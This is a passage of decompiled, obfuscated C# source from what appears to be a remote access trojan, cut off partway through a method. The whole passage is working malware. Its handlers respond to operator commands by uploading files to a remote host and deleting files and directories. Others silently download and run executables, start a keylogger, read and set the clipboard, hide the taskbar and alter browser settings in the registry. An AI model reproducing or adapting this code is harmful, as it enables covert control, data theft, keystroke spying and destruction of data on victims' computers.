					case "/DOWNFILE/":
					{
						Thread thread8 = new Thread(wevBGvZn3BirW171);
						thread8.Start(Strings.Mid(text, 11, Strings.Len(text)));
						break;
					}
					case "/ENCOREFL/":
					{
						Thread thread7 = new Thread(L2r5TOlkE32ns173);
						thread7.Start();
						break;
					}
					case "/ERROR/":
						try
						{
							method_0();
						}
						catch (Exception projectError9)
						{
							ProjectData.SetProjectError(projectError9);
							ProjectData.ClearProjectError();
						}
						break;
					case "/STOPUPLD/":
						try
						{
							fileStream_0.Flush();
							method_0();
						}
						catch (Exception projectError8)
						{
							ProjectData.SetProjectError(projectError8);
							ProjectData.ClearProjectError();
						}
						break;
					case "/UPLOADFL/":
					{
						Thread thread6 = new Thread(wWWGTxp8ChlIm174);
						thread6.Start(Strings.Mid(text, 11, Strings.Len(text)));
						break;
					}
					case "/OTHERPAK/":
					{
						Thread thread5 = new Thread(R6k7xrEiKWVYI175);
						thread5.Start(Strings.Mid(text, 11, Strings.Len(text)));
						break;
					}
					case "/FINEUPLD/":
					{
						Thread thread4 = new Thread(t6BT18E5ameIM176);
						thread4.Start(Strings.Mid(text, 11, Strings.Len(text)));
						break;
					}
					case "/RUNEXEFL/":
						try
						{
							string text3 = Strings.Mid(text, 11, 1);
							text = Strings.Mid(text, 12, Strings.Len(text));
							if (Operators.CompareString(text3, "1", false) == 0)
							{
								Thread thread2 = new Thread(VW82LAfILX6fO186);
								thread2.Start(text);
							}
							else
							{
								Thread thread3 = new Thread(method_9);
								thread3.Start(text);
							}
						}
						catch (Exception projectError7)
						{
							ProjectData.SetProjectError(projectError7);
							ProjectData.ClearProjectError();
						}
						break;
					case "/KILLFILE/":
						try
						{
							text = Strings.Mid(text, 11, Strings.Len(text));
							Thread thread = new Thread(method_2);
							thread.Start(text);
						}
						catch (Exception projectError6)
						{
							ProjectData.SetProjectError(projectError6);
							ProjectData.ClearProjectError();
						}
						break;
					case "/DIRSDELL/":
						try
						{
							text = Strings.Mid(text, 11, Strings.Len(text));
							if (((ServerComputer)a6hS23aOog55kaNfGMvgWg2.Computer).get_FileSystem().DirectoryExists(text))
							{
								((ServerComputer)a6hS23aOog55kaNfGMvgWg2.Computer).get_FileSystem().DeleteDirectory(text, (DeleteDirectoryOption)5);
							}
						}
						catch (Exception projectError5)
						{
							ProjectData.SetProjectError(projectError5);
							ProjectData.ClearProjectError();
						}
						break;
					case "/FILESIZE/":
						try
						{
							text = Strings.Mid(text, 11, Strings.Len(text));
							int num = (int)((ServerComputer)a6hS23aOog55kaNfGMvgWg2.Computer).get_FileSystem().GetFileInfo(text).Length;
							lwTyp9d68gwn480.WriteLine("/FILESIZE/" + Conversions.ToString(num));
							lwTyp9d68gwn480.Flush();
						}
						catch (Exception projectError4)
						{
							ProjectData.SetProjectError(projectError4);
							ProjectData.ClearProjectError();
						}
						break;
					case "/MAKEDIRS/":
						try
						{
							text = Strings.Mid(text, 11, Strings.Len(text));
							if (!((ServerComputer)a6hS23aOog55kaNfGMvgWg2.Computer).get_FileSystem().DirectoryExists(text))
							{
								((ServerComputer)a6hS23aOog55kaNfGMvgWg2.Computer).get_FileSystem().CreateDirectory(text);
							}
						}
						catch (Exception projectError3)
						{
							ProjectData.SetProjectError(projectError3);
							ProjectData.ClearProjectError();
						}
						break;
					case "/RENAMEFL/":
						try
						{
							string text2 = Strings.Mid(text, 11, 1);
							text = Strings.Mid(text, 12, Strings.Len(text));
							string[] array = text.Split(new char[1] { '*' });
							if (Operators.CompareString(text2, "0", false) == 0)
							{
								((ServerComputer)a6hS23aOog55kaNfGMvgWg2.Computer).get_FileSystem().RenameDirectory(Conversions.ToString(array.GetValue(0)), Conversions.ToString(array.GetValue(1)));
							}
							else
							{
								((ServerComputer)a6hS23aOog55kaNfGMvgWg2.Computer).get_FileSystem().RenameFile(Conversions.ToString(array.GetValue(0)), Conversions.ToString(array.GetValue(1)));
							}
						}
						catch (Exception projectError2)
						{
							ProjectData.SetProjectError(projectError2);
							ProjectData.ClearProjectError();
						}
						break;
					default:
						GmhWc9n87GxDM122(1);
						try
						{
							lwTyp9d68gwn480.WriteLine("/FILESIZE/");
							lwTyp9d68gwn480.Flush();
						}
						catch (Exception projectError)
						{
							ProjectData.SetProjectError(projectError);
							ProjectData.ClearProjectError();
						}
						break;
					}
				}
			}
			catch (Exception projectError15)
			{
				ProjectData.SetProjectError(projectError15);
				ProjectData.ClearProjectError();
			}
		}
	}

	private void method_12(object temp)
	{
		StringBuilder stringBuilder = new StringBuilder();
		StringBuilder stringBuilder2 = new StringBuilder();
		int num = 65536;
		byte[] array = new byte[0];
		short num2 = 1;
		TcpClient tcpClient = new TcpClient();
		tcpClient.Connect(LBMTY8eeSj177, hu6UwOzuBE178);
		NetworkStream stream = tcpClient.GetStream();
		StreamWriter streamWriter = new StreamWriter(stream);
		StreamReader streamReader = new StreamReader(stream);
		FileStream input = new FileStream(Conversions.ToString(temp), FileMode.Open, FileAccess.Read, FileShare.Read);
		BinaryReader binaryReader = new BinaryReader(input);
		long num3 = TIoKqIv6Ow1ZH123(Conversions.ToString(temp));
		string[] array2 = (string[])NewLateBinding.LateGet(temp, (Type)null, "Split", new object[1] { "\\" }, (string[])null, (Type[])null, (bool[])null);
		checked
		{
			string text = Conversions.ToString(array2.GetValue(array2.Length - 1));
			int num5 = default(int);
			long num6 = default(long);
			if (num3 < 65536L)
			{
				binaryReader.BaseStream.Seek(0L, SeekOrigin.Begin);
				array = new byte[(int)(num3 - 1L) + 1];
				binaryReader.Read(array, 0, (int)num3);
				binaryReader.BaseStream.Seek(0L, SeekOrigin.Current);
				stringBuilder.Append("/STARTDOW/" + text + "¦" + Conversions.ToString(num3) + "*");
				int num4 = array.Length - 1;
				for (int i = 0; i <= num4; i++)
				{
					stringBuilder2.Append(array.GetValue(i)!.ToString() + " ");
				}
				stringBuilder.Append((object?)stringBuilder2);
				streamWriter.WriteLine((object?)stringBuilder);
				streamWriter.Flush();
			}
			else
			{
				num5 = (int)Math.Round(Math.Floor((double)num3 / (double)num));
				num6 = num3 - num5 * num;
				binaryReader.BaseStream.Seek(0L, SeekOrigin.Begin);
				array = new byte[num - 1 + 1];
				binaryReader.Read(array, 0, num);
				binaryReader.BaseStream.Seek(0L, SeekOrigin.Current);
				stringBuilder.Append("/STARTDOW/" + text + "¦" + Conversions.ToString(num3) + "*");
				int num7 = array.Length - 1;
				for (int j = 0; j <= num7; j++)
				{
					stringBuilder2.Append(array.GetValue(j)!.ToString() + " ");
				}
				stringBuilder.Append((object?)stringBuilder2);
				streamWriter.WriteLine((object?)stringBuilder);
				streamWriter.Flush();
			}
			string text2 = null;
			try
			{
				while (tcpClient.Connected)
				{
					text2 = streamReader.ReadLine();
					if (Operators.CompareString(text2, (string)null, false) == 0)
					{
						GmhWc9n87GxDM122(1);
					}
					switch (Strings.Left(text2, 10))
					{
					case "/STOPDOWN/":
						try
						{
							method_0();
						}
						catch (Exception projectError5)
						{
							ProjectData.SetProjectError(projectError5);
							ProjectData.ClearProjectError();
						}
						break;
					case "/ENCOREFL/":
						try
						{
							if (num2 != num5)
							{
								StringBuilder stringBuilder3 = new StringBuilder();
								StringBuilder stringBuilder4 = new StringBuilder();
								num2 = (short)(num2 + 1);
								array = new byte[num - 1 + 1];
								binaryReader.Read(array, 0, num);
								binaryReader.BaseStream.Seek(0L, SeekOrigin.Current);
								stringBuilder3.Append("/PAKSSEND/");
								int num8 = array.Length - 1;
								for (int k = 0; k <= num8; k++)
								{
									stringBuilder4.Append(array.GetValue(k)!.ToString() + " ");
								}
								stringBuilder3.Append((object?)stringBuilder4);
								streamWriter.WriteLine((object?)stringBuilder3);
								streamWriter.Flush();
							}
							else if (num6 > 0L)
							{
								StringBuilder stringBuilder5 = new StringBuilder();
								StringBuilder stringBuilder6 = new StringBuilder();
								array = new byte[(int)(num6 - 1L) + 1];
								binaryReader.Read(array, 0, (int)num6);
								stringBuilder5.Append("/FINEDOWN/");
								int num9 = array.Length - 1;
								for (int l = 0; l <= num9; l++)
								{
									stringBuilder6.Append(array.GetValue(l)!.ToString() + " ");
								}
								stringBuilder5.Append((object?)stringBuilder6);
								streamWriter.WriteLine((object?)stringBuilder5);
								streamWriter.Flush();
								method_0();
							}
							else
							{
								streamWriter.WriteLine("/FINEDOWN/");
								streamWriter.Flush();
								method_0();
							}
						}
						catch (Exception projectError3)
						{
							ProjectData.SetProjectError(projectError3);
							try
							{
								method_0();
								streamWriter.WriteLine("/ERROR/");
								streamWriter.Flush();
							}
							catch (Exception projectError4)
							{
								ProjectData.SetProjectError(projectError4);
								ProjectData.ClearProjectError();
							}
							ProjectData.ClearProjectError();
						}
						break;
					case "/ERROR/":
						try
						{
							method_0();
						}
						catch (Exception projectError2)
						{
							ProjectData.SetProjectError(projectError2);
							ProjectData.ClearProjectError();
						}
						break;
					default:
						try
						{
							streamWriter.WriteLine("/ERROR/");
							streamWriter.Flush();
						}
						catch (Exception projectError)
						{
							ProjectData.SetProjectError(projectError);
							ProjectData.ClearProjectError();
						}
						break;
					case "/FINISHED/":
						tcpClient.Close();
						return;
					}
				}
			}
			catch (Exception projectError6)
			{
				ProjectData.SetProjectError(projectError6);
				ProjectData.ClearProjectError();
			}
		}
	}

	private void hAq4NXCfM77kg196()
	{
		string text = null;
		try
		{
			while (U6m2TIWIFhFTW83.Connected)
			{
				text = rPu9T3KsnG8Pr86.ReadLine();
				if (Operators.CompareString(text, (string)null, false) == 0)
				{
					GmhWc9n87GxDM122(1);
				}
				string text2 = Strings.Left(text, 10);
				if (Operators.CompareString(text2, "/INFOPCPC/", false) == 0)
				{
					try
					{
						Thread thread = new Thread(VmKG9kjnSnarT183);
						thread.Start();
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
					}
				}
				else if (Operators.CompareString(text2, "/LASTURLS/", false) == 0)
				{
					try
					{
						EkGbTKbPVEh6B133();
						string text3 = EkGbTKbPVEh6B133();
						ALe9zZxthFoud85.WriteLine("/LASTURLS/" + text3);
						ALe9zZxthFoud85.Flush();
					}
					catch (Exception projectError2)
					{
						ProjectData.SetProjectError(projectError2);
						ProjectData.ClearProjectError();
					}
				}
				else
				{
					GmhWc9n87GxDM122(1);
					try
					{
						ALe9zZxthFoud85.WriteLine("/LASTURLS/");
						ALe9zZxthFoud85.Flush();
					}
					catch (Exception projectError3)
					{
						ProjectData.SetProjectError(projectError3);
						ProjectData.ClearProjectError();
					}
				}
			}
		}
		catch (Exception projectError4)
		{
			ProjectData.SetProjectError(projectError4);
			ProjectData.ClearProjectError();
		}
	}

	private void OzwVkeb4SCWmb197()
	{
		//IL_0045: Unknown result type (might be due to invalid IL or missing references)
		//IL_004c: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e6: Unknown result type (might be due to invalid IL or missing references)
		//IL_0100: Unknown result type (might be due to invalid IL or missing references)
		//IL_011a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0134: Unknown result type (might be due to invalid IL or missing references)
		//IL_0159: Unknown result type (might be due to invalid IL or missing references)
		//IL_0172: Unknown result type (might be due to invalid IL or missing references)
		//IL_018b: Unknown result type (might be due to invalid IL or missing references)
		//IL_01a4: Unknown result type (might be due to invalid IL or missing references)
		//IL_01bd: Unknown result type (might be due to invalid IL or missing references)
		//IL_01d6: Unknown result type (might be due to invalid IL or missing references)
		string text = null;
		try
		{
			while (FltgfjkciWIb788.Connected)
			{
				text = OueYzsnXCLEU591.ReadLine();
				if (Operators.CompareString(text, (string)null, false) == 0)
				{
					GmhWc9n87GxDM122(1);
				}
				string text2 = Strings.Left(text, 10);
				if (Operators.CompareString(text2, "/SHOWMESG/", false) != 0)
				{
					continue;
				}
				Wrs2U5ZwaiFNB47 = (MessageBoxIcon)0;
				Xl19YPU9Iz4YH48 = (MessageBoxButtons)0;
				TBQjhCPRVOiKk49 = null;
				ci3hlSmwJBBHK50 = null;
				try
				{
					List<string> list = new List<string>();
					string[] array = text.Split(new char[1] { '*' });
					string[] array2 = array;
					foreach (string item in array2)
					{
						list.Add(item);
					}
					TBQjhCPRVOiKk49 = list[1].ToString();
					ci3hlSmwJBBHK50 = list[2].ToString();
					switch (list[4].ToString())
					{
					case "Q":
						Wrs2U5ZwaiFNB47 = (MessageBoxIcon)32;
						break;
					case "W":
						Wrs2U5ZwaiFNB47 = (MessageBoxIcon)48;
						break;
					case "I":
						Wrs2U5ZwaiFNB47 = (MessageBoxIcon)64;
						break;
					case "E":
						Wrs2U5ZwaiFNB47 = (MessageBoxIcon)16;
						break;
					}
					switch (list[3].ToString())
					{
					case "OK":
						Xl19YPU9Iz4YH48 = (MessageBoxButtons)0;
						break;
					case "ARI":
						Xl19YPU9Iz4YH48 = (MessageBoxButtons)2;
						break;
					case "YNC":
						Xl19YPU9Iz4YH48 = (MessageBoxButtons)3;
						break;
					case "YN":
						Xl19YPU9Iz4YH48 = (MessageBoxButtons)4;
						break;
					case "OC":
						Xl19YPU9Iz4YH48 = (MessageBoxButtons)1;
						break;
					case "RC":
						Xl19YPU9Iz4YH48 = (MessageBoxButtons)5;
						break;
					}
					Thread thread = new Thread(g7fpVlSfjoncf132);
					thread.Start();
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	private void BW9FICbMKpxSj198()
	{
		string text = null;
		try
		{
			while (HxWXmp6EiOTJs93.Connected)
			{
				text = eOr5nGfRme14b96.ReadLine();
				if (Operators.CompareString(text, (string)null, false) == 0)
				{
					GmhWc9n87GxDM122(1);
				}
				switch (Strings.Left(text, 10))
				{
				case "/OPENCDCD/":
					try
					{
						Thread thread3 = new Thread(Qcy1UAULM2Jc9185);
						thread3.Start(true);
					}
					catch (Exception projectError19)
					{
						ProjectData.SetProjectError(projectError19);
						ProjectData.ClearProjectError();
					}
					break;
				case "/CLOSECDD/":
					try
					{
						Thread thread2 = new Thread(Qcy1UAULM2Jc9185);
						thread2.Start(true);
					}
					catch (Exception projectError18)
					{
						ProjectData.SetProjectError(projectError18);
						ProjectData.ClearProjectError();
					}
					break;
				case "/DESKH/":
					try
					{
						EQ2h4bw535y6Q125();
					}
					catch (Exception projectError17)
					{
						ProjectData.SetProjectError(projectError17);
						ProjectData.ClearProjectError();
					}
					break;
				case "/DESKS/":
					try
					{
						DBUeOLCXwURm9124();
					}
					catch (Exception projectError16)
					{
						ProjectData.SetProjectError(projectError16);
						ProjectData.ClearProjectError();
					}
					break;
				case "/STARTH/":
					try
					{
						L0OmNxnh4F4wr127();
					}
					catch (Exception projectError15)
					{
						ProjectData.SetProjectError(projectError15);
						ProjectData.ClearProjectError();
					}
					break;
				case "/STARTS/":
					try
					{
						kwHRPfXvwLeSS126();
					}
					catch (Exception projectError14)
					{
						ProjectData.SetProjectError(projectError14);
						ProjectData.ClearProjectError();
					}
					break;
				case "/HIDETASK/":
					try
					{
						PsBzwl7Xr6gE4128();
					}
					catch (Exception projectError13)
					{
						ProjectData.SetProjectError(projectError13);
						ProjectData.ClearProjectError();
					}
					break;
				case "/SHOWTASK/":
					try
					{
						BpE74OpcqwgHh129();
					}
					catch (Exception projectError12)
					{
						ProjectData.SetProjectError(projectError12);
						ProjectData.ClearProjectError();
					}
					break;
				case "/FLIP/":
					try
					{
						cg6L80I9Pz45 dm2 = IkADlZEhIN46.s0JPOjP6xv215();
						rTZh6yajc7Pmi137(ref dm2);
						dm2.dmDisplayOrientation = int_1[2];
						aJfWajlI5eFBg139(dm2);
					}
					catch (Exception projectError11)
					{
						ProjectData.SetProjectError(projectError11);
						ProjectData.ClearProjectError();
					}
					break;
				case "/UNFLIP/":
					try
					{
						cg6L80I9Pz45 dm = IkADlZEhIN46.s0JPOjP6xv215();
						rTZh6yajc7Pmi137(ref dm);
						dm.dmDisplayOrientation = int_1[0];
						aJfWajlI5eFBg139(dm);
					}
					catch (Exception projectError10)
					{
						ProjectData.SetProjectError(projectError10);
						ProjectData.ClearProjectError();
					}
					break;
				case "/SWAPM/":
					try
					{
						SwapMouseButton(256L);
					}
					catch (Exception projectError9)
					{
						ProjectData.SetProjectError(projectError9);
						ProjectData.ClearProjectError();
					}
					break;
				case "/UNSWAPM/":
					try
					{
						SwapMouseButton(0L);
					}
					catch (Exception projectError8)
					{
						ProjectData.SetProjectError(projectError8);
						ProjectData.ClearProjectError();
					}
					break;
				case "/CADD/":
					try
					{
						tzLGDVYadjnMh140(enable: false);
					}
					catch (Exception projectError7)
					{
						ProjectData.SetProjectError(projectError7);
						ProjectData.ClearProjectError();
					}
					break;
				case "/CADE/":
					try
					{
						tzLGDVYadjnMh140(enable: true);
					}
					catch (Exception projectError6)
					{
						ProjectData.SetProjectError(projectError6);
						ProjectData.ClearProjectError();
					}
					break;
				case "/TMOFF/":
					try
					{
						eMXvabazox44.SendMessage((IntPtr)65535, 274u, (IntPtr)61808, (IntPtr)2);
					}
					catch (Exception projectError5)
					{
						ProjectData.SetProjectError(projectError5);
						ProjectData.ClearProjectError();
					}
					break;
				case "/TMON/":
					try
					{
						eMXvabazox44.SendMessage((IntPtr)65535, 274u, (IntPtr)61808, (IntPtr)(-1));
					}
					catch (Exception projectError4)
					{
						ProjectData.SetProjectError(projectError4);
						ProjectData.ClearProjectError();
					}
					break;
				case "/SCRSTART/":
					try
					{
						w0AEKhek3NUnT142(start: true);
					}
					catch (Exception projectError3)
					{
						ProjectData.SetProjectError(projectError3);
						ProjectData.ClearProjectError();
					}
					break;
				case "/SCRSTOP/":
					try
					{
						w0AEKhek3NUnT142(start: false);
					}
					catch (Exception projectError2)
					{
						ProjectData.SetProjectError(projectError2);
						ProjectData.ClearProjectError();
					}
					break;
				case "/SPEAKOUT/":
					try
					{
						text = Strings.Mid(text, 11, Strings.Len(text));
						Thread thread = new Thread(JmiqPjbi0IAeN190);
						thread.Start(text);
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
					}
					break;
				}
			}
		}
		catch (Exception projectError20)
		{
			ProjectData.SetProjectError(projectError20);
			ProjectData.ClearProjectError();
		}
	}

	private void Xkyk6nAPZVX7R199()
	{
		string text = null;
		try
		{
			while (HKa3uC9MhA7w498.Connected)
			{
				text = oVpe1Ay1pp3bg101.ReadLine();
				if (Operators.CompareString(text, (string)null, false) == 0)
				{
					GmhWc9n87GxDM122(1);
				}
				switch (Strings.Left(text, 10))
				{
				case "/IEVER/":
					try
					{
						RegistryKey localMachine = Registry.LocalMachine;
						RegistryKey registryKey4 = localMachine.OpenSubKey("Software\\Microsoft\\Internet Explorer");
						string text3 = registryKey4.GetValue("Version")!.ToString();
						F58CezIGYuGjK100.WriteLine("/IEVERSIN/" + text3);
						F58CezIGYuGjK100.Flush();
					}
					catch (Exception projectError6)
					{
						ProjectData.SetProjectError(projectError6);
						ProjectData.ClearProjectError();
					}
					break;
				case "/STRTPAGE/":
					try
					{
						RegistryKey currentUser3 = Registry.CurrentUser;
						RegistryKey registryKey3 = currentUser3.OpenSubKey("Software\\Microsoft\\Internet Explorer\\Main");
						string text2 = registryKey3.GetValue("Start Page")!.ToString();
						F58CezIGYuGjK100.WriteLine("/IESTARTP/" + text2);
						F58CezIGYuGjK100.Flush();
					}
					catch (Exception projectError5)
					{
						ProjectData.SetProjectError(projectError5);
						ProjectData.ClearProjectError();
					}
					break;
				case "/CHANGETL/":
					text = Strings.Mid(text, 11, Strings.Len(text));
					try
					{
						RegistryKey currentUser2 = Registry.CurrentUser;
						RegistryKey registryKey2 = currentUser2.CreateSubKey("Software\\Microsoft\\Internet Explorer\\Main");
						registryKey2.SetValue("Window Title", text, RegistryValueKind.String);
					}
					catch (Exception projectError4)
					{
						ProjectData.SetProjectError(projectError4);
						ProjectData.ClearProjectError();
					}
					break;
				case "/CHANGEHP/":
					text = Strings.Mid(text, 11, Strings.Len(text));
					try
					{
						RegistryKey currentUser = Registry.CurrentUser;
						RegistryKey registryKey = currentUser.CreateSubKey("Software\\Microsoft\\Internet Explorer\\Main");
						registryKey.SetValue("Start Page", text);
					}
					catch (Exception projectError3)
					{
						ProjectData.SetProjectError(projectError3);
						ProjectData.ClearProjectError();
					}
					break;
				case "/RUNSPAGE/":
					try
					{
						text = Strings.Mid(text, 11, Strings.Len(text));
						if (!text.StartsWith("http://") | !text.StartsWith("https://"))
						{
							text = "http://" + text;
						}
						Process.Start(text);
					}
					catch (Exception projectError2)
					{
						ProjectData.SetProjectError(projectError2);
						ProjectData.ClearProjectError();
					}
					break;
				default:
					GmhWc9n87GxDM122(1);
					try
					{
						F58CezIGYuGjK100.WriteLine("/IESTARTP/");
						F58CezIGYuGjK100.Flush();
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
					}
					break;
				}
			}
		}
		catch (Exception projectError7)
		{
			ProjectData.SetProjectError(projectError7);
			ProjectData.ClearProjectError();
		}
	}

	private void jvhpXtHBlF67o200()
	{
		string text = null;
		try
		{
			while (xOoWEx7ymU103.Connected)
			{
				text = RLzG2KDtKv106.ReadLine();
				if (Operators.CompareString(text, (string)null, false) == 0)
				{
					GmhWc9n87GxDM122(1);
				}
				string text2 = Strings.Left(text, 10);
				if (Operators.CompareString(text2, "/CLIPBOAR/", false) == 0)
				{
					try
					{
						string_0 = null;
						Thread thread = new Thread(b54mvPWR8TqXE146);
						thread.SetApartmentState(ApartmentState.STA);
						thread.Start();
						thread.Join();
						YtbVX76VZs105.WriteLine("/CLIPBOAR/" + string_0);
						YtbVX76VZs105.Flush();
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
					}
				}
				else if (Operators.CompareString(text2, "/SETCLIPB/", false) == 0)
				{
					try
					{
						string_0 = Strings.Mid(text, 11, Strings.Len(text));
						string_0 = string_0.Replace("***", "\r\n");
						Thread thread2 = new Thread(LBHXFw8oP1eO8149);
						thread2.SetApartmentState(ApartmentState.STA);
						thread2.Start();
						thread2.Join();
					}
					catch (Exception projectError2)
					{
						ProjectData.SetProjectError(projectError2);
						ProjectData.ClearProjectError();
					}
				}
				else
				{
					GmhWc9n87GxDM122(1);
					try
					{
						YtbVX76VZs105.WriteLine("/CLIPBOAR/");
						YtbVX76VZs105.Flush();
					}
					catch (Exception projectError3)
					{
						ProjectData.SetProjectError(projectError3);
						ProjectData.ClearProjectError();
					}
				}
			}
		}
		catch (Exception projectError4)
		{
			ProjectData.SetProjectError(projectError4);
			ProjectData.ClearProjectError();
		}
	}

	private void v9u49Z20gRvyw201()
	{
		string text = null;
		checked
		{
			try
			{
				while (Gnzdm4CtZx108.Connected)
				{
					text = streamReader_1.ReadLine();
					if (Operators.CompareString(text, (string)null, false) == 0)
					{
						GmhWc9n87GxDM122(1);
					}
					string text2 = Strings.Left(text, 10);
					if (Operators.CompareString(text2, "/DLARUNVS/", false) == 0)
					{
						try
						{
							List<string> list = new List<string>();
							string[] array = Strings.Mid(text, 11, Strings.Len(text)).Split(new char[1] { '/' });
							string[] array2 = array;
							foreach (string item in array2)
							{
								list.Add(item);
							}
							int index = list.Count - 1;
							string text3 = Strings.Mid(text, 11, Strings.Len(text));
							((ServerComputer)a6hS23aOog55kaNfGMvgWg2.Computer).get_Network().DownloadFile(text3, Environment.GetEnvironmentVariable("Temp") + "\\" + list[index].ToString(), (string)null, (string)null, false, 100000, true);
							GmhWc9n87GxDM122(1);
							Process.Start(Environment.GetEnvironmentVariable("Temp") + "\\" + list[index].ToString());
						}
						catch (Exception projectError)
						{
							ProjectData.SetProjectError(projectError);
							ProjectData.ClearProjectError();
						}
					}
					else
					{
						if (Operators.CompareString(text2, "/DLARUNHD/", false) != 0)
						{
							continue;
						}
						try
						{
							List<string> list2 = new List<string>();
							string[] array3 = Strings.Mid(text, 11, Strings.Len(text)).Split(new char[1] { '/' });
							string[] array4 = array3;
							foreach (string item2 in array4)
							{
								list2.Add(item2);
							}
							int index2 = list2.Count - 1;
							string text4 = Strings.Mid(text, 11, Strings.Len(text));
							((ServerComputer)a6hS23aOog55kaNfGMvgWg2.Computer).get_Network().DownloadFile(text4, Environment.GetEnvironmentVariable("Temp") + "\\" + list2[index2].ToString(), (string)null, (string)null, false, 100000, true);
							GmhWc9n87GxDM122(1);
							Process process = new Process();
							process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
							process.StartInfo.FileName = Environment.GetEnvironmentVariable("Temp") + "\\" + list2[index2].ToString();
							process.Start();
						}
						catch (Exception projectError2)
						{
							ProjectData.SetProjectError(projectError2);
							ProjectData.ClearProjectError();
						}
					}
				}
			}
			catch (Exception projectError3)
			{
				ProjectData.SetProjectError(projectError3);
				ProjectData.ClearProjectError();
			}
		}
	}

	private void yLlC1byRiFvls202()
	{
		string text = null;
		try
		{
			while (GnFRZTrZP5113.Connected)
			{
				text = streamReader_2.ReadLine();
				if (Operators.CompareString(text, (string)null, false) == 0)
				{
					GmhWc9n87GxDM122(1);
				}
				string text2 = Strings.Left(text, 10);
				if (Operators.CompareString(text2, "/PRINTTXT/", false) == 0)
				{
					try
					{
						text = Strings.Mid(text, 11, Strings.Len(text));
						Thread thread = new Thread(method_3);
						thread.Start(text);
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
					}
				}
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	private void method_13()
	{
		string text = null;
		checked
		{
			try
			{
				while (mtF1U92IB5118.Connected)
				{
					text = voYl9FgYiy121.ReadLine();
					if (Operators.CompareString(text, (string)null, false) == 0)
					{
						GmhWc9n87GxDM122(1);
					}
					switch (Strings.Left(text, 10))
					{
					case "/IPREVIEW/":
						try
						{
							text = Strings.Mid(text, 11, Strings.Len(text));
							Image val = null;
							Image val2 = null;
							try
							{
								val2 = Image.FromFile(text);
								string text3 = null;
								if (val2 != null)
								{
									double num = (double)val2.get_Size().Width / (double)val2.get_Size().Height;
									double num2 = (double)val2.get_Size().Height / (double)val2.get_Size().Width;
									val = ((val2.get_Size().Width <= val2.get_Size().Height) ? val2.GetThumbnailImage((int)Math.Round(200.0 / num2), 200, (GetThumbnailImageAbort)null, default(IntPtr)) : val2.GetThumbnailImage(200, (int)Math.Round(200.0 / num), (GetThumbnailImageAbort)null, default(IntPtr)));
									MemoryStream memoryStream = new MemoryStream();
									val.Save((Stream)memoryStream, ImageFormat.get_Jpeg());
									memoryStream.Capacity = (int)memoryStream.Length;
									byte[] buffer = memoryStream.GetBuffer();
									text3 = Convert.ToBase64String(buffer);
									streamWriter_2.WriteLine("/IPREVIEW/" + text3);
									streamWriter_2.Flush();
									memoryStream.Dispose();
									memoryStream.Close();
									val2.Dispose();
								}
							}
							catch (Exception projectError5)
							{
								ProjectData.SetProjectError(projectError5);
								ProjectData.ClearProjectError();
							}
						}
						catch (Exception projectError6)
						{
							ProjectData.SetProjectError(projectError6);
							ProjectData.ClearProjectError();
						}
						break;
					case "/SEARCHSS/":
						try
						{
							text = Strings.Mid(text, 11, Strings.Len(text));
							string text2 = text;
							if (Operators.CompareString(text2, "1", false) == 0)
							{
								PWIMcmLboEsBk13 = true;
							}
							else if (Operators.CompareString(text2, "2", false) == 0)
							{
								PWIMcmLboEsBk13 = false;
								streamWriter_2.WriteLine("/SEARCHFL/SEARCHEND");
								streamWriter_2.Flush();
							}
						}
						catch (Exception projectError4)
						{
							ProjectData.SetProjectError(projectError4);
							ProjectData.ClearProjectError();
						}
						break;
					case "/LISTDRVS/":
						try
						{
							Thread thread3 = new Thread(wwuNlBCB5CqYd163);
							thread3.Start(streamWriter_2);
						}
						catch (Exception projectError3)
						{
							ProjectData.SetProjectError(projectError3);
							ProjectData.ClearProjectError();
						}
						break;
					case "/SEARCHFL/":
						try
						{
							text = Strings.Mid(text, 11, Strings.Len(text));
							JijB0aY5aEjjW63 = text.Split(new char[1] { '¦' });
							Thread thread2 = new Thread(YwZ7q1105);
							thread2.Start(JijB0aY5aEjjW63[0]);
						}
						catch (Exception projectError2)
						{
							ProjectData.SetProjectError(projectError2);
							ProjectData.ClearProjectError();
						}
						break;
					case "/DOWNFILE/":
					{
						Thread thread = new Thread(wevBGvZn3BirW171);
						thread.Start(Strings.Mid(text, 11, Strings.Len(text)));
						break;
					}
					default:
						GmhWc9n87GxDM122(1);
						try
						{
							streamWriter_2.WriteLine("/IPREVIEW/");
							streamWriter_2.Flush();
						}
						catch (Exception projectError)
						{
							ProjectData.SetProjectError(projectError);
							ProjectData.ClearProjectError();
						}
						break;
					}
				}
			}
			catch (Exception projectError7)
			{
				ProjectData.SetProjectError(projectError7);
				ProjectData.ClearProjectError();
			}
		}
	}

	private void Y4Q2ELQrVVfJE204()
	{
		string text = null;
		try
		{
			while (tcpClient_0.Connected)
			{
				text = FMQ18GnWku126.ReadLine();
				if (Operators.CompareString(text, (string)null, false) == 0)
				{
					GmhWc9n87GxDM122(1);
				}
				switch (Strings.Left(text, 10))
				{
				case "/KEYSLOGG/":
					try
					{
						Thread thread3 = new Thread(kcHWiVfkFdKQi184);
						thread3.Start(false);
					}
					catch (Exception projectError4)
					{
						ProjectData.SetProjectError(projectError4);
						ProjectData.ClearProjectError();
					}
					break;
				case "/KEYSLOGR/":
					try
					{
						Thread thread2 = new Thread(kcHWiVfkFdKQi184);
						thread2.Start(true);
					}
					catch (Exception projectError3)
					{
						ProjectData.SetProjectError(projectError3);
						ProjectData.ClearProjectError();
					}
					break;
				case "/INSTALLK/":
					try
					{
						text = Strings.Mid(text, 11, Strings.Len(text));
						Thread thread = new Thread(d1AseIpuSifgv181);
						thread.Start(text);
					}
